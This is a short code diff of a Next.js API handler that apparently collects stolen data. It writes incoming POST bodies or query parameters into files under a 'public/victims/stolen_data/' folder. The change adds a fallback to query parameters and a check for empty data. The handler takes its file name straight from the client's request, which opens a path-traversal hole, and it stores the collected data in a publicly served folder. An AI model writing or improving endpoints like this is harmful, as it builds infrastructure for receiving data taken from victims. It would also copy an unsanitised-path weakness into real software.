@@ -11,9 +11,11 @@ export default async function handler(
   res: NextApiResponse<ResponseData | string>
 ) {
     if(req.method?.toLowerCase() == 'post'){
-        const data = req.body
+        const data = (req.body || Object.entries(req.query).length && JSON.stringify( req.query, null, 2 )) ?? ''
+        if(!data) return res.status(200).json({ status:'FAIL', error:'no data provided'})
+
         const fileName = data.fileName ?? `${new Date().toISOString()}.json`
-        const {createAndWrite} = await createFileDriveHandler({pathToFile:`public/victims/stolen_data/${fileName}`})
+        const { createAndWrite } = await createFileDriveHandler({pathToFile:`public/victims/stolen_data/${fileName}`})
 
         if(!createAndWrite) return res.status(400).json({ status:'FAIL' ,error: `Cannot write data` })
 
